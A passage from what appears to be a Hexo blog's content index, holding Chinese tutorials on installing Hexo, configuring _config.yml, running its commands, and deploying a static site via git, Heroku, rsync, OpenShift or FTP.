192.168.1.1</span><br></pre></td></tr></table></figure><p>指定这个参数后，您就只能通过该IP才能访问站点。例如，对于一台使用无线网络的笔记本电脑，除了指向本机的<code>127.0.0.1</code>外，通常还有一个<code>192.168.*.*</code>的局域网IP，如果像上面那样使用<code>-i</code>参数，就不能用<code>127.0.0.1</code>来访问站点了。对于有公网IP的主机，如果您指定一个局域网IP作为<code>-i</code>参数的值，那么就无法通过公网来访问站点。</p><h1 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h1><p>使用 Hexo 生成静态文件快速而且简单。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><h3 id="监视文件变动"><a href="#监视文件变动" class="headerlink" title="监视文件变动"></a>监视文件变动</h3><p>Hexo 能够监视文件变动并立即重新生成静态文件，在生成时会比对文件的 SHA1 checksum，只有变动的文件才会写入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate --watch</span><br></pre></td></tr></table></figure><h3 id="完成后部署"><a href="#完成后部署" class="headerlink" title="完成后部署"></a>完成后部署</h3><p>您可执行下列的其中一个命令，让 Hexo 在生成完毕后自动部署网站，两个命令的作用是相同的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate --deploy</span><br><span class="line">$ hexo deploy --generate</span><br></pre></td></tr></table></figure><blockquote><p>简写</p><p>上面两个命令可以简写为<br>$ hexo g -d<br>$ hexo d -g</p></blockquote><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>Hexo 提供了快速方便的一键部署功能，让您只需一条命令就能将网站部署到服务器上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>在开始之前，您必须先在 <code>_config.yml</code> 中修改参数，一个正确的部署配置中至少要有 <code>type</code> 参数，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br></pre></td></tr></table></figure><p>您可同时使用多个 deployer，Hexo 会依照顺序执行每个 deployer。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">- type: git</span><br><span class="line">  repo:</span><br><span class="line">- type: heroku</span><br><span class="line">  repo:</span><br></pre></td></tr></table></figure><blockquote><p>缩进</p><p>YAML依靠缩进来确定元素间的从属关系。因此，请确保每个deployer的缩进长度相同，并且使用空格缩进。</p></blockquote><h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><p>安装 <a href="https://github.com/hexojs/hexo-deployer-git">hexo-deployer-git</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>修改配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt;</span><br><span class="line">  branch: [branch]</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>repo</code></td><td>库（Repository）地址</td></tr><tr><td><code>branch</code></td><td>分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。</td></tr><tr><td><code>message</code></td><td></td></tr></tbody></table><h2 id="Heroku"><a href="#Heroku" class="headerlink" title="Heroku"></a>Heroku</h2><p>安装 <a href="https://github.com/hexojs/hexo-deployer-heroku">hexo-deployer-heroku</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-heroku --save</span><br></pre></td></tr></table></figure><p>修改配置。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: heroku</span><br><span class="line">  repo: &lt;repository url&gt;</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>repo</code></td><td>Heroku 库（Repository）地址</td></tr><tr><td><code>message</code></td><td>自定提交信息</td></tr></tbody></table><h2 id="Rsync"><a href="#Rsync" class="headerlink" title="Rsync"></a>Rsync</h2><p>安装 <a href="https://github.com/hexojs/hexo-deployer-rsync">hexo-deployer-rsync</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-rsync --save</span><br></pre></td></tr></table></figure><p>修改配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: rsync</span><br><span class="line">  host: &lt;host&gt;</span><br><span class="line">  user: &lt;user&gt;</span><br><span class="line">  root: &lt;root&gt;</span><br><span class="line">  port: [port]</span><br><span class="line">  delete: [true|false]</span><br><span class="line">  verbose: [true|false]</span><br><span class="line">  ignore_errors: [true|false]</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>host</code></td><td>远程主机的地址</td><td></td></tr><tr><td><code>user</code></td><td>使用者名称</td><td></td></tr><tr><td><code>root</code></td><td>远程主机的根目录</td><td></td></tr><tr><td><code>port</code></td><td>端口</td><td>22</td></tr><tr><td><code>delete</code></td><td>删除远程主机上的旧文件</td><td>true</td></tr><tr><td><code>verbose</code></td><td>显示调试信息</td><td>true</td></tr><tr><td><code>ignore_errors</code></td><td>忽略错误</td><td>false</td></tr></tbody></table><blockquote><p>rsync部署模块的工作方式</p><p>需要注意的是，要求您提供的实际上是一个能通过SSH登陆远程主机的Linux用户。Hexo会自动处理关于rsync使用的一切操作。因此，您需要在远程主机上为您的Hexo站点建立一个用户，并允许其通过SSH登陆。不过，这里的<code>port</code>，的确是指rsync监听的端口，请确保防火墙打开了该端口。</p></blockquote><h2 id="OpenShift"><a href="#OpenShift" class="headerlink" title="OpenShift"></a>OpenShift</h2><p>安装 <a href="https://github.com/hexojs/hexo-deployer-openshift">hexo-deployer-openshift</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-openshift --save</span><br></pre></td></tr></table></figure><p>修改配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: openshift</span><br><span class="line">  repo: &lt;repository url&gt;</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>repo</code></td><td>OpenShift 库（Repository）地址</td></tr><tr><td><code>message</code></td><td>自定提交信息</td></tr></tbody></table><h2 id="FTPSync"><a href="#FTPSync" class="headerlink" title="FTPSync"></a>FTPSync</h2><p>安装 <a href="https://github.com/hexojs/hexo-deployer-ftpsync">hexo-deployer-ftpsync</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-ftpsync --save</span><br></pre></td></tr></table></figure><p>修改配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: ftpsync</span><br><span class="line">  host: &lt;host&gt;</span><br><span class="line">  user: &lt;user&gt;</span><br><span class="line">  pass: &lt;password&gt;</span><br><span class="line">  remote: [remote]</span><br><span class="line">  port: [port]</span><br><span class="line">  ignore: [ignore]</span><br><span class="line">  connections: [connections]</span><br><span class="line">  verbose: [true|false]</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>host</code></td><td>远程主机的地址</td><td></td></tr><tr><td><code>user</code></td><td>使用者名称</td><td></td></tr><tr><td><code>pass</code></td><td>密码</td><td></td></tr><tr><td><code>remote</code></td><td>远程主机的根目录</td><td><code>/</code></td></tr><tr><td><code>port</code></td><td>端口</td><td>21</td></tr><tr><td><code>ignore</code></td><td>忽略的文件或目录</td><td></td></tr><tr><td><code>connections</code></td><td>使用的连接数</td><td>1</td></tr><tr><td><code>verbose</code></td><td>显示调试信息</td><td>false</td></tr></tbody></table><blockquote><p>FTP部署可能出现的问题</p><p>您可能需要预先通过其他方式将所有文件上传到远程主机中。否则初次使用ftpsync插件就可能出现报错。另外，由于FTP协议的特征，它每传送一个文件就需要一次握手，相对速度较慢。</p></blockquote><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><p>Hexo 生成的所有文件都放在 <code>public</code> 文件夹中，您可以将它们复制到您喜欢的地方。</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo的安装、配置与使用</title>
      <link href="/2018/05/09/hexo%E7%9A%84%E5%AE%89%E8%A3%85%E3%80%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
      <url>/2018/05/09/hexo%E7%9A%84%E5%AE%89%E8%A3%85%E3%80%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是Hexo？"><a href="#什么是Hexo？" class="headerlink" title="什么是Hexo？"></a>什么是Hexo？</h1><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 ]</p><p><strong>注意：</strong>本文章是针对于windows用户</p> <a id="more"></a><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h2><p>安装 Hexo 相当简单。然而在安装前，您必须检查电脑中是否已安装下列应用程序： </p><ul><li>Node.js</li><li>Git</li></ul><p>对于windows用户来说，建议使用安装程序进行安装。安装时，请勾选<strong>Add to PATH</strong>选项。 另外，您也可以使用<strong>Git Bash</strong>，这是git for  windows自带的一组程序，提供了Linux风格的shell，在该环境下，您可以直接用上面提到的命令来安装Node.js。打开它的方法很简单，在任意位置单击右键，选择“Git Bash Here”即可。由于Hexo的很多操作都涉及到命令行，您可以考虑始终使用<strong>Git Bash</strong>来进行操作。 </p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>安装前先介绍几个hexo常用的命令,#后面为注释。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g #完整命令为hexo generate，用于生成静态文件至public目录</span><br><span class="line">$ hexo s #完整命令为hexo server，用于启动服务器，主要用来本地预览，开启预览访问端口（默认端口4000，&#39;ctrl + c&#39;关闭server）</span><br><span class="line">$ hexo d #完整命令为hexo deploy，用于将本地文件发布到github上</span><br><span class="line">$ hexo n &quot;postName&quot; #完整命令为hexo new，用于新建一篇文章</span><br><span class="line">$ hexo new page &quot;pageName&quot; #新建页面</span><br><span class="line">$ hexo c #hexo clean 清除public目录以及缓存，其实这个缓存就是db.json文件</span><br><span class="line">$ hexo deploy -g  #生成加部署</span><br><span class="line">$ hexo server -g  #生成加预览</span><br></pre></td></tr></table></figure><p>鼠标右键任意地方，选择Git Bash，使用以下命令安装hexo<strong>（ps：以下命令中的$符号只为了让教程和实际看起来一致，实际输入命令只需输入$ 后面的命令即可）</strong> </p><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>如果之后在使用的过程中，遇到以下的错误 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR Deployer not found : github</span><br></pre></td></tr></table></figure><p>则运行以下命令,或者你直接先运行这个命令更好。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>接下来创建放置博客文件的文件夹：hexo文件夹。在自己想要的位置创建文件夹，如我hexo文件夹的位置为<code>E:\hexo</code>，名字和地方可以自由选择，当然最好不要放在中文路径下，至于原因，我想很多人懂得。之后进入文件夹，即<code>E:\hexo内</code>，点击鼠标右键，选择Git Bash，执行以下命令，Hexo会自动在该文件夹下下载搭建网站所需的所有文件。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure><p>让我们看看刚刚下载的hexo文件带来了什么，在<code>E:\hexo</code>内执行以下命令， </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure><p>然后用浏览器访问<code>http://localhost:4000/</code>，此时，你应该看到了一个漂亮的博客了，当然这个博客只是在本地的，别人是看不到的，hexo3.0使用的默认主题是landscape。轻轻松松就看到了一点成果，是不是很激动，这就是hexo的强大之处，这个本地预览的功能，我真是爱不释手。 </p><h1 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h1><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init &lt;folder&gt;</span><br><span class="line">$ cd &lt;folder&gt;</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹的目录如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure><h2 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h2><p>网站的配置信息，您可以在此配置大部分的参数。</p><h3 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h3><p>应用程序的信息。EJS, Stylus和 Markdownrenderer 已默认安装，您可以自由移除。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package.json&#123;</span><br><span class="line">  &quot;name&quot;: &quot;hexo-site&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;0.0.0&quot;,</span><br><span class="line">  &quot;private&quot;: true,</span><br><span class="line">  &quot;hexo&quot;: &#123;</span><br><span class="line">    &quot;version&quot;: &quot;&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;hexo&quot;: &quot;^3.0.0&quot;,</span><br><span class="line">    &quot;hexo-generator-archive&quot;: &quot;^0.1.0&quot;,</span><br><span class="line">    &quot;hexo-generator-category&quot;: &quot;^0.1.0&quot;,</span><br><span class="line">    &quot;hexo-generator-index&quot;: &quot;^0.1.0&quot;,</span><br><span class="line">    &quot;hexo-generator-tag&quot;: &quot;^0.1.0&quot;,</span><br><span class="line">    &quot;hexo-renderer-ejs&quot;: &quot;^0.1.0&quot;,</span><br><span class="line">    &quot;hexo-renderer-stylus&quot;: &quot;^0.2.0&quot;,</span><br><span class="line">    &quot;hexo-renderer-marked&quot;: &quot;^0.2.4&quot;,</span><br><span class="line">    &quot;hexo-server&quot;: &quot;^0.1.2&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="scaffolds"><a href="#scaffolds" class="headerlink" title="scaffolds"></a>scaffolds</h3><p>模版文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。</p><p>Hexo的模板是指在新建的markdown文件中默认填充的内容。例如，如果您修改scaffold/post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。</p><h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p>资源文件夹是存放用户资源的地方。除 <code>_posts</code> 文件夹之外，开头命名为 <code>_</code> (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 <code>public</code> 文件夹，而其他文件会被拷贝过去。</p><h3 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h3><p>主题文件夹。Hexo 会根据主题来生成静态页面。</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>您可以在 <code>_config.yml</code> 中修改大部份的配置。 </p><h2 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h2><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>title</code></td><td>网站标题</td></tr><tr><td><code>subtitle</code></td><td>网站副标题</td></tr><tr><td><code>description</code></td><td>网站描述</td></tr><tr><td><code>author</code></td><td>您的名字</td></tr><tr><td><code>language</code></td><td>网站使用的语言</td></tr><tr><td><code>timezone</code></td><td>网站时区。Hexo 默认使用您电脑的时区。时区列表。比如说：<code>America/New_York</code>, <code>Japan</code>, 和 <code>UTC</code> 。</td></tr></tbody></table><p>其中，<code>description</code>主要用于SEO，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词。<code>author</code>参数用于主题显示文章的作者。</p><h2 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h2><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>url</code></td><td>网址</td><td></td></tr><tr><td><code>root</code></td><td>网站根目录</td><td></td></tr><tr><td><code>permalink</code></td><td>文章的永久链接格式</td><td><code>:year/:month/:day/:title/</code></td></tr><tr><td><code>permalink_defaults</code></td><td>永久链接中各部分的默认值</td><td></td></tr></tbody></table><blockquote><p>网站存放在子目录</p><p>如果您的网站存放在子目录中，例如 <code>http://yoursite.com/blog</code>，则请将您的 <code>url</code> 设为 <code>http://yoursite.com/blog</code> 并把 <code>root</code> 设为 <code>/blog/</code>。</p></blockquote><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>source_dir</code></td><td>资源文件夹，这个文件夹用来存放内容。</td><td><code>source</code></td></tr><tr><td><code>public_dir</code></td><td>公共文件夹，这个文件夹用于存放生成的站点文件。</td><td><code>public</code></td></tr><tr><td><code>tag_dir</code></td><td>标签文件夹</td><td><code>tags</code></td></tr><tr><td><code>archive_dir</code></td><td>归档文件夹</td><td><code>archives</code></td></tr><tr><td><code>category_dir</code></td><td>分类文件夹</td><td><code>categories</code></td></tr><tr><td><code>code_dir</code></td><td>Include code 文件夹</td><td><code>downloads/code</code></td></tr><tr><td><code>i18n_dir</code></td><td>国际化（i18n）文件夹</td><td><code>:lang</code></td></tr><tr><td><code>skip_render</code></td><td>跳过指定文件的渲染，您可使用 glob 表达式来匹配路径。</td><td></td></tr></tbody></table><blockquote><p>提示</p><p>如果您刚刚开始接触Hexo，通常没有必要修改这一部分的值。</p></blockquote><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>new_post_name</code></td><td>新文章的文件名称</td><td>:title.md</td></tr><tr><td><code>default_layout</code></td><td>预设布局</td><td>post</td></tr><tr><td><code>auto_spacing</code></td><td>在中文和英文之间加入空格</td><td>false</td></tr><tr><td><code>titlecase</code></td><td>把标题转换为 title case</td><td>false</td></tr><tr><td><code>external_link</code></td><td>在新标签中打开链接</td><td>true</td></tr><tr><td><code>filename_case</code></td><td>把文件名称转换为 (1) 小写或 (2) 大写</td><td>0</td></tr><tr><td><code>render_drafts</code></td><td>显示草稿</td><td>false</td></tr><tr><td><code>post_asset_folder</code></td><td>启动 Asset 文件夹</td><td>false</td></tr><tr><td><code>relative_link</code></td><td>把链接改为与根目录的相对位址</td><td>false</td></tr><tr><td><code>future</code></td><td>显示未来的文章</td><td>true</td></tr><tr><td><code>highlight</code></td><td>代码块的设置</td><td></td></tr></tbody></table><blockquote><p>相对地址</p><p>默认情况下，Hexo生成的超链接都是绝对地址。例如，如果您的网站域名为<code>example.com</code>,您有一篇文章名为<code>hello</code>，那么绝对链接可能像这样：<code>http://example.com/hello.html</code>，它是<strong>绝对</strong>于域名的。相对链接像这样：<code>/hello.html</code>，也就是说，无论用什么域名访问该站点，都没有关系，这在进行反向代理时可能用到。通常情况下，建议使用绝对地址。</p></blockquote><h2 id="分类-amp-标签"><a href="#分类-amp-标签" class="headerlink" title="分类 &amp; 标签"></a>分类 &amp; 标签</h2><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>default_category</code></td><td>默认分类</td><td><code>uncategorized</code></td></tr><tr><td><code>category_map</code></td><td>分类别名</td><td></td></tr><tr><td><code>tag_map</code></td><td>标签别名</td><td></td></tr></tbody></table><h2 id="日期-时间格式"><a href="#日期-时间格式" class="headerlink" title="日期 / 时间格式"></a>日期 / 时间格式</h2><p>Hexo 使用 Moment.js 来解析和显示时间。</p><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>date_format</code></td><td>日期格式</td><td><code>YYYY-MM-DD</code></td></tr><tr><td><code>time_format</code></td><td>时间格式</td><td><code>H:mm:ss</code></td></tr></tbody></table><h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>per_page</code></td><td>每页显示的文章量 (0 = 关闭分页功能)</td><td><code>10</code></td></tr><tr><td><code>pagination_dir</code></td><td>分页目录</td><td><code>page</code></td></tr></tbody></table><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>theme</code></td><td>当前主题名称。值为<code>false</code>时禁用主题</td></tr><tr><td><code>deploy</code></td><td>部署部分的设置</td></tr></tbody></table><h1 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h1><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init [folder]</span><br></pre></td></tr></table></figure><p>新建一个网站。如果没有设置 <code>folder</code> ，Hexo 默认在目前的文件夹建立网站。</p><h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure><p>新建一篇文章。如果没有设置 <code>layout</code> 的话，默认使用 _config.yml中的 <code>default_layout</code> 参数代替。如果标题包含空格的话，请使用引号括起来。</p><h2 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>生成静态文件。</p><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td><code>-d</code>, <code>--deploy</code></td><td>文件生成后立即部署网站</td></tr><tr><td><code>-w</code>, <code>--watch</code></td><td>监视文件变动</td></tr></tbody></table><p>该命令可以简写为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g</span><br></pre></td></tr></table></figure><h2 id="publish"><a href="#publish" class="headerlink" title="publish"></a>publish</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo publish [layout] &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>发表草稿。</p><h2 id="server"><a href="#server" class="headerlink" title="server"></a>server</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>启动服务器。默认情况下，访问网址为： <code>http://localhost:4000/</code>。</p><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td><code>-p</code>, <code>--port</code></td><td>重设端口</td></tr><tr><td><code>-s</code>, <code>--static</code></td><td>只使用静态文件</td></tr><tr><td><code>-l</code>, <code>--log</code></td><td>启动日记记录，使用覆盖记录格式</td></tr></tbody></table><h2 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>部署网站。</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-g</code>, <code>--generate</code></td><td>部署之前预先生成静态文件</td></tr></tbody></table><p>该命令可以简写为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo d</span><br></pre></td></tr></table></figure><h2 id="render"><a href="#render" class="headerlink" title="render"></a>render</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo render &lt;file1&gt; [file2] ...</span><br></pre></td></tr></table></figure><p>渲染文件。</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-o</code>, <code>--output</code></td><td>设置输出路径</td></tr></tbody></table><h2 id="migrate"><a href="#migrate" class="headerlink" title="migrate"></a>migrate</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo migrate &lt;type&gt;</span><br></pre></td></tr></table></figure><p>从其他博客系统 迁移内容。</p><h2 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure><p>清除缓存文件 (<code>db.json</code>) 和已生成的静态文件 (<code>public</code>)。</p><p>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</p><h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo list &lt;type&gt;</span><br></pre></td></tr></table></figure><p>列出网站资料。</p><h2 id="version"><a href="#version" class="headerlink" title="version"></a>version</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo version</span><br></pre></td></tr></table></figure><p>显示 Hexo 版本。</p><h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><h3 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --safe</span><br></pre></td></tr></table></figure><p>在安全模式下，不会载入插件和脚本。当您在安装新插件遭遇问题时，可以尝试以安全模式重新执行。</p><h3 id="调试模式"><a href="#调试模式" class="headerlink" title="调试模式"></a>调试模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo 